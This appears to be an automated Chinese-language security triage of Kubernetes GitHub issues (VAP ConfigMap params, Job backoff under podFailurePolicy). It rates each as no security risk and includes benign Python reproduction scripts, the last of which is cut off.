用户的 `patch` 操作失败了，收到的错误信息明确指出 Pod 的 `spec` 中的某些字段（包括 `volumes`）在创建后是不可变的 (`Forbidden: pod updates may not change fields other than...`)。

核心问题在于用户试图修改 Pod 的不可变字段，这是 Kubernetes 设计上的限制，而非安全漏洞。用户遇到的问题是如何正确配置 StatefulSet 以实现其目标（即手动、静态地将特定 PVC 绑定到特定 Pod 序号），这属于 Kubernetes 的使用方法和配置范畴。该 Issue 没有报告任何软件缺陷，更不涉及安全漏洞，如命令执行、提权、信息泄露等。用户提供的 YAML 配置和尝试的命令也未暴露敏感信息或引入安全风险。

**复现过程：**

```python
# 该 Issue 是一个关于 Kubernetes 配置和使用的问题，并非安全漏洞报告。
# 用户尝试修改 Pod 的不可变字段导致操作失败，这是 Kubernetes 的预期行为。
# 因此，不存在需要复现的安全风险，无需提供 POC 脚本。

print("该 Issue 描述的是 Kubernetes 配置问题，非安全漏洞，无需 POC。")
```


**解释说明：**

上述 Issue 的核心是用户询问如何在 Kubernetes StatefulSet 中为每个 Pod 手动指定一个已存在的 PVC，并报告了自己尝试使用 `kubectl patch` 修改运行中 Pod 的 Volume 配置失败的情况。Kubernetes 的 Pod API 设计规定了 Pod 的某些核心规格（如挂载的 Volume 定义）在创建后是不可变的。用户收到的错误信息 `Forbidden: pod updates may not change fields...` 准确地反映了这一设计约束。

因此，该 Issue 描述的是一个功能咨询或配置错误，而不是一个安全漏洞。它不涉及任何潜在的攻击向量、权限提升、信息泄露或拒绝服务风险。根据风险判断标准第 2 条，该 Issue 应判断为 "不涉及" 安全风险。

由于风险评级为 "不涉及"，因此不需要提供用于复现安全漏洞的 POC 脚本。提供的 Python 代码仅作为占位符，并说明了不提供实际 POC 的原因。

---


## Issue #130887 Validating Admission Policy with configmap parameter not working

- Issue 链接：[#130887](https://github.com/kubernetes/kubernetes/issues/130887)

### Issue 内容

#### What happened?

I'm testing VAP in my local cluster(currently using Virtualbox with Vagrant).  
I tried to use `paramKind` in VAP and `paramRef` in VAPB, as document said that configMap or any resources can be used in those fields, I used configmap.  
Creating VAP was good, but when I tried to check the policy works well, server returned error with this message.  
```
ValidatingAdmissionPolicy 'deny-hostpath-policy' with binding 'default-deny-hostpath' denied request: failed to configure binding: no params found for policy binding with `Deny` parameterNotFoundAction
```

#### What did you expect to happen?

I hoped the server returns deny because of the validations rules. 

#### How can we reproduce it (as minimally and precisely as possible)?

```
apiVersion: v1
kind: ConfigMap
metadata:
  name: "test"
  namespace: "default"
data:
  subjects: "sam"
  secret_role_prefix: "secret"
---
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata:
  name: "deny-secret-policy"
spec:
  failurePolicy: Fail
  paramKind:
    apiVersion: v1
    kind: ConfigMap
  matchConstraints:
    resourceRules:
    - apiGroups:   ["rbac.authorization.k8s.io"]
      apiVersions: ["v1"]
      operations:  ["CREATE", "UPDATE"]
      resources:   ["roles", "rolebindings"]
  validations:
    - expression: "params != null"
      message: "params missing but required to bind to this policy"
      messageExpression: "string(params.data.subjects)"
    - expression: "false"
---
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicyBinding
metadata:
  name: "default-deny-secret"
spec:
  paramRef:
    name: "test"
    namespace: "default"
    parameterNotFoundAction: Deny
  policyName: "deny-secret-policy"
  validationActions: [Deny]
  matchResources:
    namespaceSelector:
      matchLabels:
        kubernetes.io/metadata.name: default
```  
  
ConfigMap, ValidatingAdmissionPolicy, ValidatingAdmissionPolicyBinding manifests used for test.    
```
# use user sam
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: sam-secret
  namespace: default
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "watch", "list", "create", "delete"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: sam-secret
  namespace: default
subjects:
- kind: User
  name: sam
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: sam-secret
  apiGroup: rbac.authorization.k8s.io
```  

Role, RoleBinding manifests for checking validating policy.  

![Image](https://github.com/user-attachments/assets/f8508e99-8d2b-4b6f-b9bf-2190633fbf29)




#### Anything else we need to know?

What I tried:  
- Made the ConfigMap first, and after it created, then made VAP, VAPB --> not worked.  
- Changed matchConditions. i.e) not about rbac, such as pods

Extra FeatureGates:
- CSIVolumeHealth=true
- RecursiveReadOnlyMounts=true


#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here  
Client Version: v1.32.2
Kustomize Version: v5.5.0
Server Version: v1.32.2
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here  
PRETTY_NAME="Ubuntu 24.04 LTS"
NAME="Ubuntu"
VERSION_ID="24.04"
VERSION="24.04 LTS (Noble Numbat)"
VERSION_CODENAME=noble
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
...
$ uname -a
# paste output here
Linux master1 6.8.0-31-generic #31-Ubuntu SMP PREEMPT_DYNAMIC Sat Apr 20 00:40:06 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>
kubeadm version: &version.Info{Major:"1", Minor:"32", GitVersion:"v1.32.2", GitCommit:"67a30c0adcf52bd3f56ff0893ce19966be12991f", GitTreeState:"clean", BuildDate:"2025-02-12T21:24:52Z", GoVersion:"go1.23.6", Compiler:"gc", Platform:"linux/amd64"}
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
containerd github.com/containerd/containerd/v2 v2.0.3 
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
For installing CNI : https://raw.githubusercontent.com/projectcalico/calico/v3.29.2/manifests/calico.yaml
</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
1.  **Issue核心问题**：用户尝试使用 Kubernetes 的 Validating Admission Policy (VAP) 功能，并配置其参数 (`params`) 从一个 ConfigMap 中获取。然而，在尝试创建一个本应被该策略拒绝的资源（Role/RoleBinding）时，API Server 返回了一个错误 `"failed to configure binding: no params found for policy binding with Deny parameterNotFoundAction"`。这表明 VAP 系统未能成功加载或识别 ConfigMap 中定义的参数，而不是根据 VAP 中定义的 `validations` 规则（其中包含 `expression: "false"`，本应导致拒绝）进行评估。
2.  **错误来源分析**：错误信息 `"no params found..."` 直接说明了问题所在：VAP Binding 配置了 `parameterNotFoundAction: Deny`，并且在处理请求时未能找到 `paramRef` 指向的 ConfigMap (`test` in `default` namespace)。尽管用户确认 ConfigMap 是存在的，但 VAP 控制器未能访问或处理它作为参数源。这更像是一个功能性 Bug 或配置交互问题，而不是一个安全漏洞。系统按照 `parameterNotFoundAction: Deny` 的指示 عملت，拒绝了请求，但这发生在参数查找阶段，而不是策略规则评估阶段。
3.  **安全风险评估**：
    *   该问题描述的是 VAP 功能未能按预期工作，无法将 ConfigMap 作为参数源成功注入 CEL 表达式进行评估。
    *   系统行为是拒绝请求，这是因为 `parameterNotFoundAction: Deny` 配置生效，阻止了因参数缺失可能导致的策略绕过。这本身是一种安全保护机制，防止在参数不可用时错误地允许请求。
    *   没有迹象表明此问题可被利用于绕过安全策略、执行未授权操作、泄露敏感信息、导致拒绝服务（DoS）或提升权限。用户遇到的问题是策略 *未能按预期方式拒绝*（即基于 `validation` 规则），而是因为 *配置错误或参数查找失败* 而拒绝。
    *   根据风险判断标准 2，该 issue 描述的问题非安全问题，是一个功能性问题。
    *   根据风险判断标准 4，这不是 issue 提交者自身的问题，而是报告 Kubernetes 组件可能存在的 Bug 或配置难题。但这并不改变问题本身的性质（非安全问题）。

**复现过程：**

```python
import yaml
import time
import logging
from kubernetes import config, client
from kubernetes.client.exceptions import ApiException

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define manifests from the issue
CONFIGMAP_YAML = """
apiVersion: v1
kind: ConfigMap
metadata:
  name: "test"
  namespace: "default"
data:
  subjects: "sam"
  secret_role_prefix: "secret"
"""

VAP_YAML = """
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicy
metadata:
  name: "deny-secret-policy"
spec:
  failurePolicy: Fail
  paramKind:
    apiVersion: v1
    kind: ConfigMap
  matchConstraints:
    resourceRules:
    - apiGroups:   ["rbac.authorization.k8s.io"]
      apiVersions: ["v1"]
      operations:  ["CREATE", "UPDATE"]
      resources:   ["roles", "rolebindings"]
  validations:
    - expression: "params != null"
      message: "params missing but required to bind to this policy"
      messageExpression: "string(params.data.subjects)"
    - expression: "false"
      message: "This rule should always deny if params are found"
"""

VAPB_YAML = """
apiVersion: admissionregistration.k8s.io/v1
kind: ValidatingAdmissionPolicyBinding
metadata:
  name: "default-deny-secret"
spec:
  paramRef:
    name: "test"
    namespace: "default"
    parameterNotFoundAction: Deny
  policyName: "deny-secret-policy"
  validationActions: [Deny]
  matchResources:
    namespaceSelector:
      matchLabels:
        kubernetes.io/metadata.name: default
"""

ROLE_YAML = """
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: sam-secret-test-role
  namespace: default
rules:
- apiGroups: [""]
  resources: ["secrets"]
  verbs: ["get", "watch", "list", "create", "delete"]
"""

def apply_manifest(api_client, manifest_yaml):
    """Applies a Kubernetes manifest YAML."""
    manifest = yaml.safe_load(manifest_yaml)
    kind = manifest.get("kind")
    api_version = manifest.get("apiVersion")
    namespace = manifest.get("metadata", {}).get("namespace", "default") # Default to 'default' if not specified
    name = manifest.get("metadata", {}).get("name")

    try:
        if api_version == "v1" and kind == "ConfigMap":
            api = client.CoreV1Api(api_client)
            api.create_namespaced_config_map(body=manifest, namespace=namespace)
            logging.info(f"ConfigMap '{name}' created in namespace '{namespace}'.")
        elif api_version == "admissionregistration.k8s.io/v1" and kind == "ValidatingAdmissionPolicy":
            api = client.AdmissionregistrationV1Api(api_client)
            api.create_validating_admission_policy(body=manifest)
            logging.info(f"ValidatingAdmissionPolicy '{name}' created.")
            # Add a small delay to allow the policy to potentially settle
            time.sleep(2)
        elif api_version == "admissionregistration.k8s.io/v1" and kind == "ValidatingAdmissionPolicyBinding":
            api = client.AdmissionregistrationV1Api(api_client)
            api.create_validating_admission_policy_binding(body=manifest)
            logging.info(f"ValidatingAdmissionPolicyBinding '{name}' created.")
            # Add a delay after binding creation for the system to sync
            time.sleep(5)
        elif api_version == "rbac.authorization.k8s.io/v1" and kind == "Role":
            api = client.RbacAuthorizationV1Api(api_client)
            api.create_namespaced_role(body=manifest, namespace=namespace)
            logging.info(f"Role '{name}' created in namespace '{namespace}'.")
        else:
            logging.warning(f"Unsupported resource kind/apiVersion: {kind}/{api_version}")
            return False
        return True
    except ApiException as e:
        # If resource already exists, consider it success for setup phases
        if e.status == 409: # Conflict (Already Exists)
             if kind not in ["Role"]: # Don't ignore conflict for the test Role
                logging.warning(f"{kind} '{name}' already exists. Skipping creation.")
                return True
             else:
                logging.error(f"Error creating Role '{name}': {e.reason} (Status: {e.status})")
                logging.debug(f"Error details: {e.body}")
                raise e # Re-raise for the test Role
        else:
            logging.error(f"Error creating {kind} '{name}': {e.reason} (Status: {e.status})")
            logging.debug(f"Error details: {e.body}")
            # For VAP/VAPB, allow some time for the webhook configuration to propagate if it fails initially
            if kind in ["ValidatingAdmissionPolicy", "ValidatingAdmissionPolicyBinding"]:
                 logging.warning("Waiting briefly after failed VAP/VAPB creation...")
                 time.sleep(5)
            raise e # Re-raise exception for other errors or the Role

def delete_manifest(api_client, manifest_yaml):
    """Deletes a Kubernetes resource defined by a manifest YAML."""
    manifest = yaml.safe_load(manifest_yaml)
    kind = manifest.get("kind")
    api_version = manifest.get("apiVersion")
    namespace = manifest.get("metadata", {}).get("namespace", "default")
    name = manifest.get("metadata", {}).get("name")

    try:
        if api_version == "v1" and kind == "ConfigMap":
            api = client.CoreV1Api(api_client)
            api.delete_namespaced_config_map(name=name, namespace=namespace)
            logging.info(f"ConfigMap '{name}' deleted from namespace '{namespace}'.")
        elif api_version == "admissionregistration.k8s.io/v1" and kind == "ValidatingAdmissionPolicy":
            api = client.AdmissionregistrationV1Api(api_client)
            api.delete_validating_admission_policy(name=name)
            logging.info(f"ValidatingAdmissionPolicy '{name}' deleted.")
        elif api_version == "admissionregistration.k8s.io/v1" and kind == "ValidatingAdmissionPolicyBinding":
            api = client.AdmissionregistrationV1Api(api_client)
            api.delete_validating_admission_policy_binding(name=name)
            logging.info(f"ValidatingAdmissionPolicyBinding '{name}' deleted.")
        elif api_version == "rbac.authorization.k8s.io/v1" and kind == "Role":
            api = client.RbacAuthorizationV1Api(api_client)
            api.delete_namespaced_role(name=name, namespace=namespace)
            logging.info(f"Role '{name}' deleted from namespace '{namespace}'.")
        else:
            logging.warning(f"Skipping deletion for unsupported resource kind/apiVersion: {kind}/{api_version}")
    except ApiException as e:
        if e.status == 404: # Not Found
            logging.warning(f"{kind} '{name}' not found. Skipping deletion.")
        else:
            logging.error(f"Error deleting {kind} '{name}': {e.reason} (Status: {e.status})")
            logging.debug(f"Error details: {e.body}")
            # Don't re-raise during cleanup to ensure other deletions attempt

def main():
    """Main function to reproduce the issue."""
    try:
        # Load Kubernetes configuration from default location (~/.kube/config)
        config.load_kube_config()
        api_client = client.ApiClient()
    except Exception as e:
        logging.error(f"Failed to load Kubernetes configuration: {e}")
        return

    resources_to_cleanup = [ROLE_YAML, VAPB_YAML, VAP_YAML, CONFIGMAP_YAML]

    try:
        logging.info("Starting reproduction steps...")

        # 1. Create ConfigMap
        if not apply_manifest(api_client, CONFIGMAP_YAML): return

        # 2. Create ValidatingAdmissionPolicy
        if not apply_manifest(api_client, VAP_YAML): return

        # 3. Create ValidatingAdmissionPolicyBinding
        if not apply_manifest(api_client, VAPB_YAML): return

        logging.info("Setup complete. Attempting to create the Role which should trigger the policy...")
        time.sleep(2) # Short delay before test

        # 4. Attempt to create the Role (this is expected to fail)
        try:
            apply_manifest(api_client, ROLE_YAML)
            logging.error("Role creation unexpectedly succeeded. The reported issue was not reproduced.")
            # If it succeeded, something is different, or the issue is fixed/intermittent
        except ApiException as e:
            if e.status == 400 or e.status == 403: # Bad Request or Forbidden usually indicate admission controller denial
                expected_error_fragment = "failed to configure binding: no params found"
                if expected_error_fragment in str(e.body):
                    logging.info(f"Successfully reproduced the issue. Role creation failed with expected error fragment: '{expected_error_fragment}'")
                    logging.info(f"Full error message: {e.reason} - Body: {e.body}")
                else:
                    logging.warning(f"Role creation failed, but the error message did not contain the expected fragment '{expected_error_fragment}'.")
                    logging.warning(f"Actual error: Status={e.status}, Reason={e.reason}, Body={e.body}")
            else:
                logging.error(f"Role creation failed with an unexpected error status code {e.status}: {e.reason}")
                logging.debug(f"Error details: {e.body}")

    except Exception as e:
        logging.error(f"An unexpected error occurred during the process: {e}")
    finally:
        logging.info("Starting cleanup...")
        # Use a reversed list for cleanup to respect dependencies roughly
        for manifest_yaml in resources_to_cleanup:
             # Add a small delay between deletions
            time.sleep(1)
            delete_manifest(api_client, manifest_yaml)
        logging.info("Cleanup finished.")

# Execute main function directly
main()
```


**解释说明：**

1.  **目的**：该脚本旨在通过编程方式复现 GitHub Issue 中描述的场景，即创建一个 Validating Admission Policy (VAP) 和 Binding，该 Binding 引用一个 ConfigMap 作为参数源，然后尝试创建一个 Role 资源，预期该创建操作会因为 VAP 无法找到参数而被拒绝。
2.  **库依赖**：脚本使用 `kubernetes` Python 客户端库与 Kubernetes API 进行交互，并使用 `yaml` 库解析 Manifest。
3.  **配置加载**：`config.load_kube_config()` 会尝试从默认路径 (`~/.kube/config`) 加载 Kubernetes 集群的连接配置。
4.  **资源定义**：Issue 中提供的 ConfigMap, ValidatingAdmissionPolicy, ValidatingAdmissionPolicyBinding, 和 Role 的 YAML Manifest 被定义为 Python 多行字符串。
5.  **资源创建 (`apply_manifest`)**：
    *   该函数接收 API 客户端和 YAML 字符串，解析 YAML 获取 `kind`, `apiVersion`, `name`, `namespace`。
    *   根据 `kind` 和 `apiVersion` 调用相应的 `kubernetes` 客户端 API 方法来创建资源（如 `create_namespaced_config_map`, `create_validating_admission_policy` 等）。
    *   添加了日志记录，并在创建 VAP 和 VAPB 后加入了短暂的 `time.sleep()`，因为 Admission Webhook/Policy 配置的生效可能需要一点时间在集群中传播。
    *   包含基本的错误处理，特别是处理资源已存在（409 Conflict）的情况，允许脚本在资源已存在时继续（除了测试目标 Role）。
6.  **复现尝试**：
    *   脚本按顺序创建 ConfigMap、VAP 和 VAPB。
    *   然后，它尝试创建 `sam-secret-test-role` 这个 Role 资源。
    *   **关键验证**：脚本将 Role 创建操作放在 `try...except ApiException` 块中。根据 Issue 报告，预期此操作会失败，并抛出 `ApiException`。脚本检查捕获的异常：
        *   状态码是否为 400 (Bad Request) 或 403 (Forbidden)，这通常是 Admission Controller 拒绝请求时返回的状态。
        *   异常的 `body`（包含 API Server 返回的详细错误信息）中是否包含关键错误片段 `"failed to configure binding: no params found"`。
    *   如果异常被捕获且包含预期的错误信息，脚本会打印成功复现问题的日志。
    *   如果 Role 创建成功，或者失败但错误信息不同，脚本会打印相应的错误或警告日志。
7.  **资源清理 (`delete_manifest`)**：
    *   `finally` 块确保无论脚本执行成功与否，都会尝试删除之前创建的所有 Kubernetes 资源，以保持环境整洁。
    *   清理时会忽略 404 (Not Found) 错误，以防资源已被手动删除或从未成功创建。
    *   按照与创建大致相反的顺序列出待清理资源 (`resources_to_cleanup`)，有助于处理依赖关系（虽然在这个简单场景中不严格）。
8.  **执行**：脚本直接调用 `main()` 函数开始执行。

**总结**：这个 Python 脚本模拟了用户在 Issue 中报告的手动步骤，使用 Kubernetes API 创建相关资源，并验证在尝试创建目标 Role 时是否收到了与 Issue 中描述的完全相同的、指示参数查找失败的错误信息。它旨在证明该功能性问题是可复现的，而不是演示一个安全漏洞。

---


## Issue #130881 Job backoff delay increases despite ignore action in pod failure policy

- Issue 链接：[#130881](https://github.com/kubernetes/kubernetes/issues/130881)

### Issue 内容

#### What happened?

With the following pod failure policy:
```yaml
  podFailurePolicy:
    rules:
      - action: Ignore
        onPodConditions:
        - type: DisruptionTarget
```
When evicting a pod, such pod won't be counted towards the backoff limit, which is expected, but backoff delay will be increased, so a new pod will be created according to the exponential backoff rules. If we drain a node with 3 job pods running on it, they will get terminated, and then new pods will be created after 40 seconds.

#### What did you expect to happen?

Configured `podFailurePolicy` suggests that pod disruption won't be treated as a job failure, so besides not counting it towards the backoff limit, pod disruption also shouldn't increase the backoff delay. In the above example, new pods should be recreated on other nodes right away.

If this is WAI, is there an option to bypass the backoff in case of an expected pod disruption?

#### How can we reproduce it (as minimally and precisely as possible)?

Example job:
```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: test-job
spec:
  parallelism: 10
  completions: 10
  podFailurePolicy:
    rules:
      - action: Ignore
        onPodConditions:
        - type: DisruptionTarget
  template:
    spec:
      containers:
      - name: pause
        image: gcr.io/google_containers/pause
        resources:
          requests:
            cpu: 500m
      restartPolicy: Never
  backoffLimit: 4
```

Apply this job, wait for pods to be running. Evict some pods, either via kubectl drain or the eviction API. Pods should get recreated after the backoff delay.

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.6-dispatcher
Kustomize Version: v5.4.2
Server Version: v1.31.5-gke.1023000
```

</details>


#### Cloud provider

<details>
GKE
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该 Issue 描述了一个 Kubernetes Job 控制器在使用 `podFailurePolicy` 时遇到的行为问题。具体来说，当 `podFailurePolicy` 设置为对 `DisruptionTarget` 类型的 Pod 条件执行 `Ignore` 操作时，虽然被驱逐（evicted）的 Pod 不计入 `backoffLimit`（失败次数限制），但 Job 控制器仍然会增加下一次 Pod 创建的退避延迟（backoff delay）。用户期望 `Ignore` 操作不仅忽略失败计数，也应该忽略退避延迟的增加，使得因节点维护等预期中断而被驱逐的 Pod 能够立即在其他节点上重新创建。

从安全角度分析：
1.  **问题性质**：该问题本质上是 Job 控制器调度逻辑和 `podFailurePolicy` 交互的一个功能性问题或预期不符的行为，而非典型的安全漏洞。它影响的是 Job Pod 因特定中断（如节点驱逐）后的恢复速度。
2.  **影响范围**：影响的是设置了特定 `podFailurePolicy` 的 Job 的 Pod 重建延迟。它不会导致信息泄露、权限提升、远程代码执行、容器逃逸等高危安全风险。
3.  **触发条件**：要触发这个问题，需要发生 Pod 驱逐事件（例如通过 `kubectl drain` 或 Eviction API）。执行这些操作通常需要较高的 Kubernetes 集群权限（如集群管理员或具有特定命名空间内 Pod 管理权限的用户）。
4.  **潜在的 DoS**？：可以认为这是一种针对特定 Job 的可用性影响或轻微的 DoS，因为 Pod 的恢复比预期的要慢。但是，根据风险判断标准 5，由于触发此行为（Pod 驱逐）通常需要非只读权限（如 `pods/evict` 权限或节点管理权限），并且影响的是 Job 自身的恢复时间，而不是导致整个集群或关键服务不可用，因此不应被评为高风险。攻击者即使有权限驱逐 Pod，也只是延迟了该 Job 的 Pod 启动，并未获得额外的权限或信息。
5.  **多用户场景**：在一个多用户环境中，一个用户（如果拥有足够权限）可以通过驱逐其自己或其他用户的 Pod 来触发这个延迟。然而，这并不能让他访问其他用户的数据或资源，只是延迟了受影响 Job 的执行。根据标准 8，虽然能影响其他用户（如果权限足够），但影响的性质（延迟 Pod 启动）不属于高危影响（如命令执行、数据窃取）。

**结论**：该 Issue 描述的是一个功能性问题，导致 Job Pod 在特定驱逐场景下恢复延迟超出预期。虽然这可能影响 Job 的可用性，但触发条件需要特定权限，且影响有限，不涉及敏感信息泄露、权限提升或代码执行等严重安全后果。因此，不将其归类为安全风险。

**复现过程：**

```python
import time
import yaml
from kubernetes import client, config
from kubernetes.client.rest import ApiException
import datetime
import sys
import threading

# Constants
NAMESPACE = "default"
JOB_NAME = "test-job-backoff-poc"
POD_LABEL_SELECTOR = f"job-name={JOB_NAME}"
JOB_YAML = f"""
apiVersion: batch/v1
kind: Job
metadata:
  name: {JOB_NAME}
spec:
  parallelism: 3 # Use a smaller parallelism for easier observation
  completions: 3
  podFailurePolicy:
    rules:
      - action: Ignore
        onPodConditions:
        - type: DisruptionTarget
  template:
    spec:
      containers:
      - name: pause
        # Using a common image that just pauses
        image: registry.k8s.io/pause:3.6
        resources:
          requests:
            cpu: 100m # Requesting minimal resources
      restartPolicy: Never
  backoffLimit: 4
"""
MAX_WAIT_SECONDS = 120 # 2 minutes overall timeout

# --- Main Function ---
def run_poc():
    """Runs the proof-of-concept to demonstrate the backoff delay issue."""
    global end_time
    end_time = time.time() + MAX_WAIT_SECONDS
    print(f"Starting POC for Issue: Job backoff delay increase with Ignore action. Max duration: {MAX_WAIT_SECONDS} seconds.")

    api_client = None
    try:
        # 1. Load Kubernetes configuration (assumes default location)
        print("Loading Kubernetes configuration...")
        try:
            config.load_kube_config()
            api_client = client.ApiClient()
        except Exception as e:
            print(f"Error loading Kubernetes configuration: {e}", file=sys.stderr)
            print("Ensure KUBECONFIG is set or ~/.kube/config exists and is valid.", file=sys.stderr)
            return

        batch_v1 = client.BatchV1Api(api_client)
        core_v1 = client.CoreV1Api(api_client)

        # 2. Define and create the Job
        print(f"Creating Job '{JOB_NAME}' in namespace '{NAMESPACE}'...")
        job_body = yaml.safe_load(JOB_YAML)
        try:
            batch_v1.create_namespaced_job(body=job_body, namespace=NAMESPACE)
            print(f"Job '{JOB_NAME}' created.")
        except ApiException as e:
            if e.status == 409: # Already exists
                 print(f"Job '{JOB_NAME}' already exists. Proceeding...")
                 # Optional: Clean up existing job first if needed
                 # print(f"Deleting existing job '{JOB_NAME}'...")
                 # try:
                 #     batch_v1.delete_namespaced_job(JOB_NAME, NAMESPACE, propagation_policy='Background')
                 #     time.sleep(5) # Give it time to delete
                 #     batch_v1.create_namespaced_job(body=job_body, namespace=NAMESPACE)
                 #     print(f"Job '{JOB_NAME}' recreated.")
                 # except ApiException as delete_e:
                 #     print(f"Error deleting existing job: {delete_e}", file=sys.stderr)
                 #     return
            else:
                print(f"Error creating Job: {e}", file=sys.stderr)
                return
        except Exception as e:
             print(f"An unexpected error occurred during job creation: {e}", file=sys.stderr)
             return

        # 3. Wait for at least one pod to be running
        print(f"Waiting for at least one pod of Job '{JOB_NAME}' to be Running...")
        running_pod_name = wait_for_running_pod(core_v1)
        if not running_pod_name:
            print("Timed out waiting for a running pod.", file=sys.stderr)
            return # Cleanup will be handled in finally
        print(f"Pod '{running_pod_name}' is Running.")

        # 4. Evict the running pod
        print(f"Evicting pod '{running_pod_name}'...")
        eviction_body = client.V1Eviction(
            metadata=client.V1ObjectMeta(name=running_pod_name, namespace=NAMESPACE),
            delete_options=client.V1DeleteOptions(grace_period_seconds=0) # Force immediate attempt
        )
        try:
            core_v1.create_namespaced_pod_eviction(name=running_pod_name, namespace=NAMESPACE, body=eviction_body)
            print(f"Eviction request sent for pod '{running_pod_name}'.")
            eviction_time = datetime.datetime.now(datetime.timezone.utc)
        except ApiException as e:
            # Handle cases where eviction might fail (e.g., PDB prevents it, pod already terminating)
            if e.status == 404:
                 print(f"Pod '{running_pod_name}' not found, might have terminated already. Cannot evict.", file=sys.stderr)
                 # Might need to select another pod or abort if none are suitable
                 return
            elif e.status == 429: # Too Many Requests - often due to PDB
                 print(f"Eviction failed for pod '{running_pod_name}', possibly due to PodDisruptionBudget. Error: {e}", file=sys.stderr)
                 # This might prevent demonstrating the issue, depending on PDB settings.
                 return
            else:
                print(f"Error evicting pod: {e}", file=sys.stderr)
                return
        except Exception as e:
            print(f"An unexpected error occurred during eviction: {e}", file=sys.stderr)
            return

        # 5. Monitor for new pod creation and measure delay
        print("Monitoring for replacement pod creation...")
        replacement_pod_info = wait_for_new_pod(core_v1, eviction_time)

        if replacement_pod_info:
            new_pod_name, creation_timestamp = replacement_pod_info
            # Timestamps are timezone-aware UTC from K8s API
            delay = creation_timestamp - eviction_time
            print(f"Replacement pod '{new_pod_name}' created at {creation_timestamp.isoformat()}.")
            print(f"Observed delay between eviction request and new pod creation: {delay.total_seconds():.2f} seconds.")
            # Default exponential backoff starts at 10s. If Ignore *prevented* backoff increase,
            # the delay should be very short (scheduling latency). If it *doesn't* prevent it,
            # the delay should be >= 10 seconds.
            if delay.total_seconds() >= 9: # Allowing slight timing variations
                print("Finding: Delay observed is consistent with backoff delay being applied despite 'Ignore' action (>= 10s expected for first failure).")
                print("This demonstrates the behavior described in the issue.")
            else:
                print(f"Finding: Delay observed ({delay.total_seconds():.2f}s) is shorter than the expected initial backoff (10s).")
                print("This might indicate the backoff was *not* significantly applied, or scheduling was very fast.")
                print("Re-run or check cluster conditions if behavior deviates from the issue report.")
        else:
            print("Timed out waiting for a replacement pod to be created.", file=sys.stderr)


    except Exception as e:
        print(f"An unexpected error occurred during POC execution: {e}", file=sys.stderr)
    finally:
        # 6. Cleanup
        print(f"Cleaning up Job '{JOB_NAME}'...")
        if api_client: # Ensure API client was initialized
            try:
                batch_v1 = client.BatchV1Api(api_client)
                batch_v1.delete_namespaced_job(
                    name=JOB_NAME,
                    namespace=NAMESPACE,
                    body=client.V1DeleteOptions(propagation_policy='Background') # Delete pods too
                )
                print(f"Job '{JOB_NAME}' deletion requested.")
            except ApiException as e:
                 # Avoid erroring out if cleanup fails (e.g., job already gone)
                 if e.status == 404:
                     print(f"Job '{JOB_NAME}' not found during cleanup.")
                 else:
                     print(f"Error cleaning up Job '{JOB_NAME}': {e}", file=sys.stderr)
            except NameError:
                 # batch_v1 might not be defined if config loading failed
                 print("Cleanup skipped as API client wasn't fully initialized.")
            except Exception as e:
                 print(f"An unexpected error occurred during cleanup: {e}", file=sys.stderr)
        else:
            print("Cleanup skipped as Kubernetes config could not be loaded.")
        print("POC finished.")

# --- Helper Functions ---
def check_timeout():
    """Checks if the maximum execution time has been exceeded."""
    if time.time() > end_time:
        raise TimeoutError("Maximum execution time reached")

def wait_for_running_pod(core_v1_api):
    """Waits for a pod belonging to the job to reach the Running state."""
    print(f"Waiting for a pod with label '{POD_LABEL_SELECTOR}' to be Running...")
    start_wait = time.time()
    while True:
        check_timeout()
        try:
            pods = core_v1_api.list_namespaced_pod(
                namespace=NAMESPACE,
                label_selector=POD_LABEL_SELECTOR
            )
            for pod in pods.items:
                # Check if pod is in a state that is considered 'running' enough for eviction test
                # Needs to be assigned to a node and ideally Running, but Pending might be ok if scheduled
                if pod.status and pod.status.phase == 'Running':
                     print(f"Found running pod: {pod.metadata.name}")
                     return pod.metadata.name
                # Add check for Pending but scheduled? Maybe not necessary for this POC.
                # elif pod.status and pod.status.phase == 'Pending' and pod.spec.node_name:
                #     print(f"Found scheduled (Pending) pod: {pod.metadata.name}")
                #     return pod.metadata.name

            print(f"No running pod found yet. Retrying... (Elapsed: {time.time() - start_wait:.1f}s)")
            time.sleep(5) # Wait before polling again

        except ApiException as e:
            print(f"Error listing pods: {e}. Retrying...", file=sys.stderr)
            time.sleep(5)
        except Exception as e:
            print(f"An unexpected error occurred waiting for running pod: {e}. Aborting wait.", file=sys.stderr)
            return None # Indicate failure

def wait_for_new_pod(core_v1_api, eviction_timestamp_utc):
    """Waits for a *new* pod (created after eviction) belonging to the job."""
    print(f"Waiting for a new pod created after {eviction_timestamp_utc.isoformat()}...")
    start_wait = time.time()
    # Give K8s some time to react before starting the check
    time.sleep(2)

    while True:
